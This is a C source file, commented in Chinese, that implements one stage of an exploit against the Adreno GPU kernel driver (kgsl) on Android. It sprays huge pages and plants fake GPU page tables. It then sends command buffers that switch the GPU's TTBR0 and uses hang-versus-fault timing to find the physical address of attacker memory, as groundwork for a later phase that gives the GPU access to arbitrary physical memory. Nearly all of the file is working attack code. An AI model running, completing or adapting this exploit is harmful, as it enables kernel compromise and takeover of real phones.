/* kgsl_ttbr2.c — TTBR0 战役 v4: NOP-sled 时序判别
 * 原理: 0x70D30004{TTBR0,0,0,0} 从 IB1 可执行(§BP)。
 *   假表(6 页, 全在候选块内)把 VA 0x4000001000 映射到块内 page5;
 *   page5 = PM4 type2 NOP 雪橇 + marker MEM_WRITE + 自跳转(无限循环)。
 *   probe: {0xD3(B) + CP_INDIRECT_BUFFER(0x4000001000)}:
 *     walk 成功 → CP 落入 NOP 循环 → 批次挂起 → kgsl ~2s 超时 (SLOW = HIT)
 *     walk 失败 → 取指立即 fault → 快速恢复 (~25ms = MISS)
 * 命中后: 扫描各块 page0+0x100 找 0x41414141 → 定位块 → 阶段2。
 * 覆盖 start-L0/L1 两种 walk 起点。
 */
#define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <string.h>
#include <time.h>
#include "adrenaline.h"

#define BLOCK_SZ 0x200000UL
#define NBLOCKS 64

static int fd;
static uint64_t g_clsz;
static uint32_t *ib;
static uint64_t ib_ga;
static uint8_t *blk[NBLOCKS];
static uint32_t ctx;

static void cache_op(void *start, void *end, int inval) {
    start = (char*)((uintptr_t)start & ~(g_clsz - 1));
    for (; start < end; start += g_clsz) {
        if (inval) __asm volatile("dc civac, %0" : : "r" (start) : "memory");
        else       __asm volatile("dc cvac, %0"  : : "r" (start) : "memory");
    }
    __asm volatile("dsb ish" ::: "memory");
}
static double now_s(void) {
    struct timespec ts; clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec + ts.tv_nsec / 1e9;
}
static void ctx_create(void) {
    struct kgsl_drawctxt_create req = { .flags = 0x00001812 };
    int r = ioctl(fd, _IOWR(0x09, 0x13, struct kgsl_drawctxt_create), &req);
    if (!r) ctx = req.drawctxt_id;
}
static void ctx_recreate(void) {
    ioctl(fd, _IOW(0x09, 0x14, struct kgsl_drawctxt_destroy),
          &(struct kgsl_drawctxt_destroy){ .drawctxt_id = ctx });
    ctx_create();
}
static int gpu_command(uint64_t gaddr, uint32_t size) {
    struct kgsl_command_object c;
    struct kgsl_gpu_command req;
    memset(&c, 0, sizeof(c));
    c.flags = KGSL_CMDLIST_IB;
    c.gpuaddr = gaddr; c.size = size;
    memset(&req, 0, sizeof(req));
    req.context_id = ctx;
    req.cmdsize = sizeof(c);
    req.numcmds = 1;
    req.cmdlist = (unsigned long)&c;
    return ioctl(fd, _IOWR(0x09, 0x4A, struct kgsl_gpu_command), &req);
}
static uint64_t wait_ts(uint32_t ts, uint32_t timeout_ms) {
    struct { uint32_t context_id, timestamp, timeout; } w = { ctx, ts, timeout_ms };
    double t0 = now_s();
    ioctl(fd, _IOWR(0x09, 0x07, char[12]), &w);
    return (uint64_t)((now_s() - t0) * 1000);
}

static long thp_bytes_of(void *p) {
    FILE *f = fopen("/proc/self/smaps", "r");
    if (!f) return -1;
    char line[256];
    uintptr_t target = (uintptr_t)p;
    int in = 0; long thp = -1;
    while (fgets(line, sizeof(line), f)) {
        uintptr_t lo, hi;
        if (sscanf(line, "%lx-%lx", &lo, &hi) == 2) { in = (target >= lo && target < hi); if (in) thp = 0; }
        else if (in && !strncmp(line, "AnonHugePages:", 14)) sscanf(line + 14, "%ld", &thp);
    }
    fclose(f);
    return thp;
}

static int spray(void) {
    for (int j = 0; j < NBLOCKS; j++) {
        uint8_t *raw = mmap(NULL, BLOCK_SZ * 2, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (raw == MAP_FAILED) return 1;
        uint8_t *base = (uint8_t*)(((uintptr_t)raw + BLOCK_SZ - 1) & ~(BLOCK_SZ - 1));
        madvise(base, BLOCK_SZ, MADV_HUGEPAGE);
        memset(base, 0, BLOCK_SZ);
        blk[j] = base;
    }
    int ok = 0;
    for (int j = 0; j < NBLOCKS; j++)
        if (thp_bytes_of(blk[j]) >= (long)BLOCK_SZ / 1024) ok++;
    printf("[spray] THP %d/%d\n", ok, NBLOCKS);
    return ok == NBLOCKS ? 0 : 1;
}

/* 假表填充(B = 候选块物理基), 使用块内 6 页:
 * pg0@B+0x0000 (L1/L0 表)  pg1@B+0x1000 (L2/L1)  pg2@B+0x2000 (L3: marker 区)
 * pg3@B+0x3000 (L3: fetch 区)  pg4@B+0x4000 (L3: start-L0 备用)  pg5@B+0x5000 (NOP 雪橇)
 * 叶子映射: VA 0x40404100 → phys B+0x100 (page0+0x100, CPU 可见, marker 落点)
 *           VA 0x4000001000-1FFF → phys B+0x5000 (NOP 雪橇页)
 */
static void fill_fake(uint64_t B) {
    uint64_t *pg0 = (uint64_t*)blk[0];   /* 注意: 调用前 blk 已换算, 用传入指针 */
    (void)pg0;
    uint64_t leaf = 0x1 | (1 << 6) | (2 << 8) | (1 << 10) | (1 << 11); /* 无 MemAttr 位, 由调用方加 */
    (void)leaf;
}

/* 实际填充: 传入块基 B 与该块 VA 指针 jv, 以及 MemAttr 索引 */
static void fill_fake2(uint64_t B, uint8_t *jv, int attr) {
    uint64_t *pg0 = (uint64_t*)jv;
    uint64_t *pg1 = (uint64_t*)(jv + 0x1000);
    uint64_t *pg2 = (uint64_t*)(jv + 0x2000);
    uint64_t *pg3 = (uint64_t*)(jv + 0x3000);
    uint64_t *pg4 = (uint64_t*)(jv + 0x4000);
    uint64_t *pg5 = (uint64_t*)(jv + 0x5000);
    uint64_t laf = 0x1 | (1 << 6) | (((uint64_t)attr) << 2) | (2 << 8) | (1 << 10) | (1 << 11);
    memset(pg0, 0, 0x1000);
    memset(pg1, 0, 0x1000);
    memset(pg2, 0, 0x1000);
    memset(pg3, 0, 0x1000);
    memset(pg4, 0, 0x1000);
    /* pg0: L0[0]/L1[1]/L1[0x100] → pg1; 由 pg1 承担 L1/L2 双角色 */
    pg0[0] = (B + 0x1000) | 3;
    pg0[1] = (B + 0x1000) | 3;
    pg0[0x100] = (B + 0x1000) | 3;
    /* pg1: L2(start-L1)/L1(start-L0) 双角色 */
    pg1[0] = (B + 0x3000) | 3;    /* VA 0x4000 0000-1FFF 区 (fetch) */
    pg3[0] = (B + 0x4000) | 3;    /* start-L0: L2[0] → pg4 */
    pg1[0x100] = (B + 0x3000) | 3; /* start-L0 L1[0x100] (VA 0x4000...) */
    pg1[1] = (B + 0x2000) | 3;    /* start-L0 L1[1] (VA 0x4040...) */
    pg1[2] = (B + 0x2000) | 3;    /* start-L1 L2[2] (VA 0x4040...) */
    /* pg2: L3(start-L1) marker 区: L3[4]: VA 0x40404100 → B+0x100; L3[2]: start-L0 L2[2] → pg4 */
    pg2[2] = (B + 0x4000) | 3;
    pg2[4] = B | laf;
    /* pg3: L3(start-L1) fetch 区: L3[0x100]: VA 0x4000001000-1FFF → B+0x5000 */
    pg3[0x100] = (B + 0x5000) | laf;
    /* pg4: L3(start-L0): L3[4] marker, L3[0x100] fetch */
    pg4[4] = B | laf;
    pg4[0x100] = (B + 0x5000) | laf;
    /* pg5: NOP 雪橇 + marker + 自跳转 */
    for (int i = 0; i < 512; i++) pg5[i] = 0x80000000u;   /* type2 NOP */
    pg5[32] = 0x703D8003;          /* CP_MEM_WRITE count=3 */
    pg5[33] = 0x40404100; pg5[34] = 0;
    pg5[35] = 0x41414141;          /* marker → VA 0x40404100 → phys B+0x100 */
    pg5[500] = 0x703F0003;         /* 自跳转(在 CIB 508 dword 窗口内) */
    pg5[501] = 0x00001000;         /* VA lo → 0x4000001000 */
    pg5[502] = 0x00000040;         /* VA hi */
    pg5[503] = 0x000001F4;         /* count = 500 → 无限循环 */
    cache_op(jv, jv + 0x6000, 0);
}

static void sweep(uint64_t start, uint64_t count) {
    if (spray()) { printf("spray fail\n"); return; }
    ctx_create();
    uint32_t ts = 0;
    double t0 = now_s();
    for (uint64_t k = 0; k < count; k++) {
        uint64_t B = start + k * BLOCK_SZ;
        /* 候选块 = 所有 64 块共用同一 B 填充? 不行 —— B 是"某一块"的物理基。
         * 填充所有块的 6 页(同一 B), 则 walk 成功的块 = 物理基恰好为 B 的那块。
         * marker 落在"该块"的 page0+0x100。 */
        for (int j = 0; j < NBLOCKS; j++)
            fill_fake2(B, blk[j], j % 8);
        uint32_t *c = ib;
        *c++ = cp_type7_packet(0xD3, 4);
        *c++ = lower_32_bits(B); *c++ = upper_32_bits(B);
        *c++ = 0; *c++ = 0;
        *c++ = cp_type7_packet(0x3f, 3);           /* CP_INDIRECT_BUFFER */
        *c++ = 0x00001000; *c++ = 0x00000040;      /* VA 0x4000001000 */
        *c++ = 0x000001FC;                          /* 508 dwords */
        uint32_t dw = (uint32_t)(c - ib);
        cache_op((uint8_t*)ib, (uint8_t*)ib + dw * 4, 0);
        ts++;
        int r = gpu_command(ib_ga, dw * 4);
        if (r) { ctx_recreate(); r = gpu_command(ib_ga, dw * 4); }
        uint64_t ms = wait_ts(ts, 6000);
        if (k % 128 == 0)
            printf("  [%7.1fs] %llu/%llu B=0x%llx %llums\n",
                   now_s() - t0, (unsigned long long)k + 1, (unsigned long long)count,
                   (unsigned long long)B, (unsigned long long)ms);
        if (ms > 1200) {
            printf("\n*** HIT: B = 0x%llx (%.1fs, 挂起 %llums = walk 成功) ***\n",
                   (unsigned long long)B, now_s() - t0, (unsigned long long)ms);
            /* 定位块: 扫各块 page0+0x100 */
            int hitb = -1;
            for (int j = 0; j < NBLOCKS; j++) {
                cache_op(blk[j] + 0x100, blk[j] + 0x104, 1);
                if (*(uint32_t*)(blk[j] + 0x100) == 0x41414141) { hitb = j; break; }
            }
            printf("marker 块 = %d (VA %p)\n", hitb, hitb >= 0 ? blk[hitb] : NULL);
            FILE *f = fopen("/data/local/tmp/ttbr_hit.txt", "w");
            if (f) { fprintf(f, "B=0x%llx block=%d va=%p\n",
                             (unsigned long long)B, hitb, hitb >= 0 ? blk[hitb] : NULL); fclose(f); }
            return;
        }
        ctx_recreate();   /* fault 后 ctx 可能已死, 直接换新 */
    }
    printf("范围无命中 (%.1fs)\n", now_s() - t0);
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    uint64_t ctr; asm("mrs\t%x0, ctr_el0" : "=r"(ctr));
    g_clsz = 4 << ((ctr >> 16) & 0xf);
    fd = open("/dev/kgsl-3d0", O_RDWR | O_CLOEXEC);
    if (fd < 0) { printf("open fail\n"); return 1; }
    ib = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    memset(ib, 0, 0x1000);
    struct kgsl_map_user_mem m;
    memset(&m, 0, sizeof(m));
    m.len = 0x1000; m.hostptr = (unsigned long)ib; m.memtype = KGSL_USER_MEM_TYPE_ADDR;
    if (ioctl(fd, _IOWR(0x09, 0x15, struct kgsl_map_user_mem), &m)) { printf("map fail\n"); return 1; }
    ib_ga = m.gpuaddr;
    printf("# ib_ga=0x%llx\n", (unsigned long long)ib_ga);
    uint64_t start = argc > 1 ? strtoull(argv[1], NULL, 0) : 0x40000000ull;
    uint64_t count = argc > 2 ? strtoull(argv[2], NULL, 0) : 7168;
    sweep(start, count);
    printf("done alive\n");
    return 0;
}
